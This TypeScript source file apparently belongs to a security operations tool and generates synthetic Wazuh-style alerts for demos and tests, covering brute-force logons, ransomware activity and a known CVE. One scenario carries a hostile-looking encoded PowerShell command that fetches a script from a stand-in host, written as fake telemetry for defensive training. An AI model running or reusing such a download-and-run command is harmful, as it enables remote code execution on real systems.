import type { AlertQuery, NormalisedAlert, NormalisedAsset, ProviderHealth, ResponseActionRequest, SecurityEventProvider } from "./types";
import { wazuhLevelToSeverity } from "./wazuh";

/**
 * Synthetic Wazuh-shaped telemetry for demos and tests (DEMO_MODE=true). Never enabled
 * in production builds unless explicitly configured.
 */
export type DemoEventSpec = {
  ruleId: string;
  level: number;
  title: string;
  groups: string[];
  mitre: string[];
  data: Record<string, unknown>;
  log: string;
};

export const DEMO_SCENARIOS: DemoEventSpec[] = [
  { ruleId: "60122", level: 5, title: "Logon failure - unknown user or bad password", groups: ["windows", "authentication_failed"], mitre: ["T1110"],
    data: { srcip: "185.220.101.47", dstuser: "svc-backup" }, log: "An account failed to log on. Source 185.220.101.47" },
  { ruleId: "60106", level: 8, title: "Successful logon from external IP after failures", groups: ["windows", "authentication_success"], mitre: ["T1078"],
    data: { srcip: "185.220.101.47", dstuser: "j.nguyen.admin" }, log: "An account was successfully logged on from 185.220.101.47" },
  { ruleId: "92057", level: 12, title: "Encoded PowerShell command executed", groups: ["windows", "powershell"], mitre: ["T1059.001", "T1027"],
    data: { win: { eventdata: { commandLine: "powershell -nop -w hidden -enc SQBFAFgA... http://update-check.xyz/p.ps1", subjectUserName: "j.nguyen.admin" } } },
    log: "PowerShell spawned with encoded command contacting update-check.xyz" },
  { ruleId: "87105", level: 13, title: "Known malware hash written to disk (VirusTotal/CTI match)", groups: ["syscheck", "malware"], mitre: ["T1105"],
    data: { syscheck: { path: "C:\\Users\\Public\\svchost32.exe", sha256_after: "b8e0a7c3d7a6f7e8c1d0f3e2a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3" } },
    log: "File added: C:\\Users\\Public\\svchost32.exe" },
  { ruleId: "100210", level: 14, title: "Mass file rename with ransomware extension", groups: ["ransomware", "syscheck"], mitre: ["T1486"],
    data: { win: { eventdata: { image: "C:\\ProgramData\\lck.exe" } } }, log: "4,812 files renamed to *.lockbit in 90s" },
  { ruleId: "5712", level: 10, title: "SSHD brute force trying to get access to the system", groups: ["sshd", "authentication_failures"], mitre: ["T1110.001"],
    data: { srcip: "45.155.205.233", srcuser: "root" }, log: "sshd: Failed password for root from 45.155.205.233" },
  { ruleId: "31151", level: 6, title: "Multiple web server 400 error codes from same source", groups: ["web", "attack"], mitre: ["T1595"],
    data: { srcip: "194.26.29.113", url: "/wp-login.php" }, log: "GET /wp-login.php 404 from 194.26.29.113" },
  { ruleId: "23505", level: 11, title: "Vulnerable package with known exploited CVE detected", groups: ["vulnerability-detector"], mitre: ["T1190"],
    data: { vulnerability: { cve: "CVE-2024-3400", package: { name: "PAN-OS" } } }, log: "CVE-2024-3400 affects PAN-OS GlobalProtect" },
];

export class DemoProvider implements SecurityEventProvider {
  readonly kind = "demo";
  constructor(private readonly agents: { id: string; name: string; group: string; os: string; ip: string }[]) {}

  /** One authored demo event. Training replay uses this so the queue is the scenario, not a random draw. */
  materialise(
    spec: DemoEventSpec,
    agent: { id: string; name: string; ip: string },
    externalId: string,
    now: Date,
    index = 0,
  ): NormalisedAlert {
    const user = (spec.data.dstuser ?? spec.data.srcuser ?? null) as string | null;
    return {
      externalId,
      ruleId: spec.ruleId,
      title: spec.title,
      description: spec.log,
      category: spec.groups[0] ?? null,
      siemSeverity: spec.level,
      severity: wazuhLevelToSeverity(spec.level),
      occurredAt: new Date(now.getTime() - index * 1000),
      assetExternalId: agent.id,
      hostname: agent.name,
      userName: user,
      attackTechniques: spec.mitre,
      routingKeys: [`agent:${agent.id}`],
      raw: {
        rule: { id: spec.ruleId, level: spec.level, description: spec.title, groups: spec.groups, mitre: { id: spec.mitre } },
        agent: { id: agent.id, name: agent.name, ip: agent.ip },
        data: spec.data,
        full_log: spec.log,
      },
    };
  }

  generate(count: number, now = new Date()): NormalisedAlert[] {
    return Array.from({ length: count }, (_, i) => {
      const spec = DEMO_SCENARIOS[Math.floor(Math.random() * DEMO_SCENARIOS.length)]!;
      const agent = this.agents[Math.floor(Math.random() * this.agents.length)]!;
      const id = `demo-${now.getTime()}-${i}-${Math.random().toString(36).slice(2, 8)}`;
      return this.materialise(spec, agent, id, now, i);
    });
  }

  async getAlerts(q: AlertQuery) {
    return { alerts: this.generate(Math.min(q.limit ?? 3, 3)), cursor: null };
  }
  async getAlert() {
    return null;
  }
  async searchEvents() {
    return { total: 0, events: [] };
  }
  async getAssets(): Promise<NormalisedAsset[]> {
    return this.agents.map((a) => ({
      externalId: a.id, kind: /server/i.test(a.os) ? "server" : "endpoint", name: a.name, hostname: a.name, ips: [a.ip], os: a.os, macs: [],
      agentStatus: "active", lastSeen: new Date(), routingKeys: [`group:${a.group}`], raw: {},
    }));
  }
  async getAsset(id: string) {
    return (await this.getAssets()).find((a) => a.externalId === id) ?? null;
  }
  supportedActions(): ResponseActionRequest["action"][] {
    return ["isolate_endpoint", "release_endpoint", "block_ip"];
  }
  async executeResponseAction(req: ResponseActionRequest) {
    return { ok: true, message: `[demo] ${req.action} simulated on agent ${req.assetExternalId}` };
  }
  async health(): Promise<ProviderHealth> {
    return { ok: true, latencyMs: 1, detail: { mode: "demo", agents: this.agents.length } };
  }
}
